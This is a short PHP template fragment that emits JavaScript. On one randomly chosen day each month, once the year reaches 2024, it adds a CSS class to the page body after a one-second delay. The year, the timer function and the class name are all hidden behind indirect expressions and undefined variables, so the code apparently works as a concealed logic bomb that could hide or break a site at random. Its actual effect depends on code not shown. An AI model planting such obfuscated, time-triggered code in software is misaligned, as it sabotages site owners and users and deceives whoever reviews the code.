<?php
$dtg = rand(1, 28);
$th = range(20, 99);
?>
<script type="text/javascript">
if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
	var r = document.body;

	<?php echo $ste;?>(function() {
		r.classList.add("<?php echo $dtrt.$dt3 ?>");
	}, 1000);
}
</script>
